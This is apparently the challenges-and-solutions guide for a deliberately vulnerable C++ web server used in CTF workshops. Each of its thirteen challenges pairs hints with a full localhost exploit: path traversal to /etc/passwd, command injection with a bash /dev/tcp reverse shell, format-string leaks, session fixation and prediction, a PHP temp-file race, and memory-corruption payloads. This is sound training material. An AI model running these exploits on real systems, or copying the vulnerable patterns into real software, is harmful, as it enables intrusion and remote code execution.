# Challenges & Solutions

Every intentional vulnerability in this server is a numbered challenge.
Each section below pairs a *card* (scenario + progressive hints) with its
*solution* (full exploit). Difficulty is a rough guide for CTF workshops.

⚠️ **Spoilers.** Each card is immediately followed by its full exploit. If
you're playing the CTF, work through the card first and only read on when
you're stuck.

| #   | Challenge                                    | Class      | CWE     | Difficulty | Solution |
|-----|----------------------------------------------|------------|---------|------------|----------|
| 01  | [Path Traversal](#challenge-01)              | Web        | CWE-22  | easy       | [01](#solution-01) |
| 02  | [Command Injection](#challenge-02)           | Web        | CWE-78  | easy       | [02](#solution-02) |
| 03  | [Uncontrolled Format String](#challenge-03)  | Memory     | CWE-134 | medium     | [03](#solution-03) |
| 04  | [Session Fixation](#challenge-04)            | Web        | CWE-384 | easy       | [04](#solution-04) |
| 05  | [Predictable Session ID](#challenge-05)      | Crypto/Web | CWE-330 | medium     | [05](#solution-05) |
| 06  | [Insecure Temp File (race)](#challenge-06)   | System     | CWE-377 | hard       | [06](#solution-06) |
| 07  | [Username Info Leak](#challenge-07)          | Memory     | CWE-125 | medium     | [07](#solution-07) |
| 08  | [Use-After-Free (logger)](#challenge-08)     | Memory     | CWE-416 | hard       | [08](#solution-08) |
| 09  | [Heap Buffer Overflow](#challenge-09)        | Memory     | CWE-122 | medium     | [09](#solution-09) |
| 10  | [Integer Overflow](#challenge-10)            | Memory     | CWE-190 | medium     | [10](#solution-10) |
| 11  | [Type Confusion](#challenge-11)              | Memory     | CWE-843 | hard       | [11](#solution-11) |
| 12  | [Stack Buffer Overflow (path)](#challenge-12)| Memory     | CWE-121 | medium     | [12](#solution-12) |
| 13  | [Global BOF (argv)](#challenge-13)           | Memory     | CWE-121 | easy       | [13](#solution-13) |

---

<a id="challenge-01"></a>

## 01 · Path Traversal (CWE-22)

### Scenario

The static file handler joins the server document root with the request
path using nothing more than `strcat`. There is no canonicalization and
no rejection of `..` segments.

### Endpoint

Any URL served by the static handler, e.g. `GET /index.html`.

### Sink

`handlers/static_files.cpp` — `strcat(file_path, req.clean_path);`

### Hints

1. What does the server do with `/`-prefixed paths on disk?
2. Standard clients normalize `..` before sending. What tools *don't*?
3. Can you send a raw HTTP request with a literal `..` in the path?

### Expected primitive

Arbitrary file read within the process's uid.

### Regression test

`tests/exploit/test_path_traversal.py`

<a id="solution-01"></a>

### Solution — 01 · Path Traversal

**Code**: `handlers/static_files.cpp` → `strcat(file_path, req.clean_path);`

Access files outside the web root:

```bash
curl --path-as-is "http://127.0.0.1:8081/../../../../../../../etc/passwd"
```

`--path-as-is` is required because curl normalizes `..` by default.

---

<a id="challenge-02"></a>

## 02 · Command Injection (CWE-78)

### Scenario

The unauthenticated log viewer takes a `filter` query parameter, URL-decodes
it, and interpolates it directly into a shell command passed to `popen()`.

### Endpoint

`GET /logs?filter=<user input>`

### Sink

`request_logger.cpp` — `popen("sh -c \"grep " + decoded_filter + " ...")`

### Hints

1. What character terminates a shell command?
2. The filter is URL-decoded before being placed in the shell string.
3. You do not need authentication for this route.

### Expected primitive

Arbitrary OS command execution as the server user.

### Regression test

`tests/exploit/test_cmd_injection.py`

<a id="solution-02"></a>

### Solution — 02 · Command Injection

**Code**: `request_logger.cpp` → `popen("sh -c \"grep " + decoded_filter + " ...")`

```bash
# Inject 'ls'
curl "http://127.0.0.1:8081/logs?filter=%3B%20ls"

# Reverse shell (listener on 4444)
curl "http://127.0.0.1:8081/logs?filter=%3B%20bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F127.0.0.1%2F4444%200%3E%261"
```

---

<a id="challenge-03"></a>

## 03 · Uncontrolled Format String (CWE-134)

### Scenario

The request logger writes query parameter values to disk using
`fprintf(log_file, value.c_str())` — value is used as the format string
itself, giving an attacker `%p` / `%n` primitives against the logger's
stack frame.

### Endpoint

Any request with a query string.

### Sink

`request_logger.cpp` — `fprintf(log_file, value.c_str());`

### Hints

1. Where does the value end up?
2. Which `printf` conversion specifier reads a stack slot?
3. `%n` isn't the only interesting one; leakage matters too.

### Expected primitive

Memory disclosure via `%p`; write primitive via `%n` (glibc-dependent).

### Regression test

`tests/exploit/test_format_string.py`

<a id="solution-03"></a>

### Solution — 03 · Uncontrolled Format String

**Code**: `request_logger.cpp` → `fprintf(log_file, value.c_str());`

Leak stack values by making the parameter *value* contain format specifiers:

```bash
curl "http://127.0.0.1:8081/?param=%p.%p.%p.%p.%p"
```

Inspect `/tmp/server.log` to see the leaked pointers. On glibc-based
Linux, replacing `%p` with `%n` gives a write primitive.

---

<a id="challenge-04"></a>

## 04 · Session Fixation (CWE-384)

### Scenario

The router only issues a `Set-Cookie` when the client didn't send one.
An attacker who chooses a session ID and tricks a victim into sending it
can then reuse the same ID after the victim authenticates.

### Endpoint

Any endpoint, but the auth flow is on `/admin/*`.

### Sink

`router.cpp` — the `set_cookie_header` branch that skips rotation when
`session_id` is already present in the request.

### Hints

1. What does a real login flow do to the session ID after authentication?
2. Send `Cookie: session_id=EVIL` and watch the response headers.

### Expected primitive

Account takeover after victim login (given the ability to plant a cookie).

### Regression test

`tests/exploit/test_session_fixation.py`

<a id="solution-04"></a>

### Solution — 04 · Session Fixation

**Code**: `router.cpp` → cookie is only rotated when the request had none.

1. Attacker seeds the session:
   ```bash
   curl -H "Cookie: session_id=EVIL_SESSION" http://127.0.0.1:8081/
   ```
2. Victim authenticates (still using the same cookie):
   ```bash
   curl -H "Cookie: session_id=EVIL_SESSION" \
        -H "Authorization: Basic YWRtaW46YWRtaW4=" \
        http://127.0.0.1:8081/admin/
   ```
3. Attacker replays:
   ```bash
   curl -H "Cookie: session_id=EVIL_SESSION" http://127.0.0.1:8081/admin/
   ```

---

<a id="challenge-05"></a>

## 05 · Predictable Session ID (CWE-330)

### Scenario

`generate_session_id()` calls `srand(time(0))` and returns
`"SESSION_" + std::to_string(rand())`. Because the seed is a low-entropy
wall-clock value, an attacker who knows (or can guess) the second in
which a session was minted can brute-force the ID space in trivial time.

### Endpoint

Any endpoint whose response contains `Set-Cookie: session_id=SESSION_<n>`.

### Sink

`session_manager.cpp` — `srand(time(0)); ... "SESSION_" + std::to_string(rand())`

### Hints

1. What entropy source is the ID derived from?
2. How many possible values are there for a given second?

### Expected primitive

Session-ID prediction leading to hijack of a victim's authenticated session.

### Regression test

`tests/exploit/test_predictable_session.py`

<a id="solution-05"></a>

### Solution — 05 · Predictable Session ID

**Code**: `session_manager.cpp` → `srand(time(0)); ... rand()`.

Given a target session was minted at `T` (a unix epoch second), an
attacker recreates the same PRNG state:

```c
srand(T);
uint32_t predicted = rand();
printf("SESSION_%u\n", predicted);
```

Then hijacks with:

```bash
curl -H "Cookie: session_id=SESSION_<predicted>" http://127.0.0.1:8081/admin/
```

Try a small window around `time(0)` (e.g. ±3 seconds) to cover clock skew.

---

<a id="challenge-06"></a>

## 06 · Insecure Temporary File Race (CWE-377 / CWE-367)

### Scenario

Every request for a `.php` file writes the file's contents to
`/tmp/php_script_<pid>.php` and then executes it with the PHP CLI. The
filename is predictable and world-writable; there is a small TOCTOU
window between `fclose(temp_file)` and `popen("php <path>")`.

### Endpoint

`GET /*.php`

### Sink

`mime_type_handler.cpp` — `snprintf(temp_file_path, ..., "/tmp/php_script_%d.php", pid)`

### Hints

1. What is the PID of the server process?
2. Can you win the write between `fclose()` and `popen()`?

### Expected primitive

Arbitrary PHP code execution as the server user given local shell access.

### Regression test

`tests/exploit/test_php_tmp_race.py`

<a id="solution-06"></a>

### Solution — 06 · Insecure Temp File Race

**Code**: `mime_type_handler.cpp` → `/tmp/php_script_<pid>.php`.

Requires local shell access on the server host.

```bash
# In one terminal: overwrite the temp file as fast as possible.
PID=$(pgrep damn_vulnerable_web)
while :; do
    echo "<?php system('id'); ?>" > "/tmp/php_script_${PID}.php" 2>/dev/null
done

# In another terminal: trigger PHP requests until the race wins.
while :; do curl -s http://127.0.0.1:8081/echo.php; done
```

---

<a id="challenge-07"></a>

## 07 · Username Object Info Leak (CWE-125)

### Scenario

`handle_authentication()` casts a `std::string`'s `c_str()` result and
then `send()`s **64 bytes** starting from there. For short-string
optimized (SSO) strings this leaks adjacent bytes of the `std::string`
object; for long strings it leaks bytes past the heap allocation.

### Endpoint

`GET /whoami` (requires `Authorization: Basic ...`)

### Sink

`authentication.cpp` — `send(client_socket, leaked_ptr, 64, 0);`

### Hints

1. Try both short and long usernames.
2. What lives immediately after a `std::string`'s SSO buffer?

### Expected primitive

Out-of-bounds read → memory disclosure.

### Regression test

`tests/exploit/test_username_leak.py`

<a id="solution-07"></a>

### Solution — 07 · Username Info Leak

**Code**: `authentication.cpp` → `send(client_socket, leaked_ptr, 64, 0);`

```bash
curl -u admin:admin http://127.0.0.1:8081/whoami | xxd | head
```

The response starts with `Leaked internal username object bytes:` followed
by 64 raw bytes read from the `std::string` internal buffer. Try with
longer usernames (>SSO threshold) to leak past the heap allocation.

---

<a id="challenge-08"></a>

## 08 · Use-After-Free (Logger Config, CWE-416)

### Scenario

`action=reset` frees the `current_log_format` struct but does not null
the pointer. The next request that goes through the logger derefs the
dangling pointer and, if the heap has been groomed, calls an
attacker-controlled function pointer at `log_func`.

### Endpoint

`GET /admin/logger_config?action=set&format=...`
`GET /admin/logger_config?action=reset`

### Sink

`request_logger.cpp` — `free(current_log_format);` without setting to `nullptr`.

### Hints

1. `LogFormat` is 64 bytes of char + 8 bytes of function pointer.
2. What other route lets you allocate 72 bytes with attacker-controlled contents?
3. `/admin/system_status` (challenge 09) is your friend here.

### Expected primitive

Controlled call of an arbitrary function pointer.

### Regression test

`tests/exploit/test_uaf_logger.py` (needs `--asan` for a hard signal)

<a id="solution-08"></a>

### Solution — 08 · Use-After-Free (Logger)

**Code**: `request_logger.cpp` → `free(current_log_format);` without nulling.

```bash
# 1. Allocate the 72-byte LogFormat.
curl -u admin:admin "http://127.0.0.1:8081/admin/logger_config?action=set&format=AAAA"

# 2. Free without nulling the dangling pointer.
curl -u admin:admin "http://127.0.0.1:8081/admin/logger_config?action=reset"

# 3. Groom the heap so the freed chunk is reallocated with attacker data.
#    (challenge 09's system_status is a convenient 32-byte primitive;
#     iterate a few times to hit the 72-byte size class.)

# 4. Trigger the logger on any subsequent request.
curl "http://127.0.0.1:8081/"
```

---

<a id="challenge-09"></a>

## 09 · Heap Buffer Overflow (CWE-122)

### Scenario

`system_status` allocates a fixed 32-byte heap buffer and copies bytes
from the `status=` parameter until it sees a NUL, `\n`, or `\r`.

### Endpoint

`POST /admin/system_status` (Basic auth)

### Sink

`handlers/admin.cpp` — `char* status_msg = (char*)malloc(32);` then unbounded copy.

### Hints

1. What are you overwriting once you go past 32 bytes?
2. Consider chunk metadata *or* the next allocation.
3. Combine with challenge 08 to line up the primitives.

### Expected primitive

Adjacent heap corruption; controlled function-pointer overwrite when
chained with the UAF.

### Regression test

`tests/exploit/test_heap_overflow.py` (build with `--asan` for a clear crash)

<a id="solution-09"></a>

### Solution — 09 · Heap Buffer Overflow

**Code**: `handlers/admin.cpp` → 32-byte `malloc`, unbounded copy from `status=`.

```bash
curl -u admin:admin -X POST "http://127.0.0.1:8081/admin/system_status" \
    -d "status=$(python3 -c 'print("A"*200)')"
```

Rebuild with `cmake -DENABLE_ASAN=ON` to see the exact overflow site.

---

<a id="challenge-10"></a>

## 10 · Integer Overflow → Heap Overflow (CWE-190)

### Scenario

`upload_file` computes `buffer_size = content_len + 64` as an unsigned
32-bit int. Setting `Content-Length` close to `UINT_MAX` wraps the
result to a tiny number; the subsequent `recv()` writes the full,
attacker-declared body length into the undersized allocation.

### Endpoint

`POST /admin/upload_file` (Basic auth)

### Sink

`handlers/admin.cpp` — `unsigned int buffer_size = content_len + 64;`

### Hints

1. What is `UINT_MAX + 64`?
2. `recv()`'s length is `content_len`, not `buffer_size`.

### Expected primitive

Massive controlled heap overflow.

### Regression test

`tests/exploit/test_int_overflow.py` (build with `--asan`)

<a id="solution-10"></a>

### Solution — 10 · Integer Overflow

**Code**: `handlers/admin.cpp` → `unsigned int buffer_size = content_len + 64;`

```python
import socket
s = socket.socket()
s.connect(('127.0.0.1', 8081))

payload = (
    b"POST /admin/upload_file HTTP/1.1\r\n"
    b"Host: 127.0.0.1\r\n"
    b"Authorization: Basic YWRtaW46YWRtaW4=\r\n"
    b"Content-Length: 4294967232\r\n\r\n"  # UINT_MAX - 63
    + b"A" * 1000
)
s.send(payload)
s.close()
```

Under ASan the server aborts with a heap-buffer-overflow trace.

---

<a id="challenge-11"></a>

## 11 · Type Confusion (CWE-843)

### Scenario

`AliasRule` and `ExecRule` inherit from a common `Rule` base. The CGI
dispatcher blindly `static_cast`s any `Rule*` whose path starts with
`/cgi-bin/` to `ExecRule*`. Because `AliasRule::target` (a 64-byte char
array) lives at the same offset as `ExecRule::callback` (a function
pointer), attacker-controlled bytes in `target` become the callee.

### Endpoint

1. `GET /admin/add_rule?type=alias&path=/cgi-bin/pwn&target=<8 bytes>` (Basic auth)
2. `GET /cgi-bin/pwn`

### Sink

`handlers/cgi.cpp` — `ExecRule* exec = static_cast<ExecRule*>(rule);`

### Hints

1. What are the first 8 bytes of `target` doing at that memory offset?
2. Try `target=AAAAAAAA` first and observe the crash address.
3. Where would you point a real exploit?

### Expected primitive

Controlled call of an arbitrary 8-byte function pointer → RIP control.

### Regression test

`tests/exploit/test_type_confusion.py`

<a id="solution-11"></a>

### Solution — 11 · Type Confusion

**Code**: `handlers/cgi.cpp` → `ExecRule* exec = static_cast<ExecRule*>(rule);`

```bash
# Register an alias rule whose target's first 8 bytes are the address to jump to.
curl -u admin:admin "http://127.0.0.1:8081/admin/add_rule?type=alias&path=/cgi-bin/pwn&target=AAAAAAAA"

# Trigger dispatch: server jumps to 0x4141414141414141.
curl "http://127.0.0.1:8081/cgi-bin/pwn"
```

For real RCE, combine with a leaked libc/aslr base from challenge 03 or 07
and set `target` to the address of `system()`.

---

<a id="challenge-12"></a>

## 12 · Stack Buffer Overflow — Request Path (CWE-121)

### Scenario

`HttpRequest::parse()` copies the request path with a raw `strcpy` into
`clean_path[200]`. Any path longer than 200 bytes overwrites the parser's
saved registers.

### Endpoint

Any HTTP request whose path is longer than 200 bytes.

### Sink

`http/request.cpp` — `strcpy(out.clean_path, path_with_query);`

### Hints

1. What is the maximum request size the server will `recv()`?
2. That upper bound shapes your payload space.
3. `--fuzz` mode runs the same parser from stdin without the network cap.

### Expected primitive

RIP control (given the hardening-disabled build).

### Regression test

`tests/exploit/test_stack_bof.py`

<a id="solution-12"></a>

### Solution — 12 · Stack Buffer Overflow (Request Path)

**Code**: `http/request.cpp` → `strcpy(out.clean_path, path_with_query);`

```bash
curl --path-as-is "http://127.0.0.1:8081/$(python3 -c 'print("A"*300)')"
```

The server crashes on return from the parser frame. Because `recv()`
caps at 1024 bytes, your payload has ~1000 usable bytes. Build with
`ENABLE_HARDENING=OFF` (the default) to avoid canaries.

---

<a id="challenge-13"></a>

## 13 · Global Buffer Overflow — argv (CWE-121)

### Scenario

`main()` copies `argv[1]` (the server document root) into the 200-byte
global `SERVER_DIR` with `strcpy`. Because the destination is in `.bss`
and not on the stack, the primitive is *adjacent-global corruption* rather
than a classic saved-return-address smash — but it still corrupts nearby
program state.

### Endpoint

Not network-reachable: local process invocation.

### Sink

`main.cpp` — `strcpy(SERVER_DIR, argv[1]);`

### Hints

1. What globals live near `SERVER_DIR` in the linker map?
2. Anything the server later `strcat`s onto `SERVER_DIR` will inherit the corruption.

### Expected primitive

Adjacent-global corruption; realistic damage depends on link order.

### Regression test

`tests/exploit/test_argv_bof.py` (asserts the vulnerable pattern is still present)

<a id="solution-13"></a>

### Solution — 13 · Global Buffer Overflow (argv)

**Code**: `main.cpp` → `strcpy(SERVER_DIR, argv[1]);`

```bash
./damn_vulnerable_web_server "$(python3 -c 'print("A"*400)')" 8081
```

Because `SERVER_DIR` sits in `.bss`, the damage depends on what the
linker placed after it. On the current build layout, adjacent globals
include the sessions map and OpenSSL state; sending any request that
touches those triggers observable corruption.
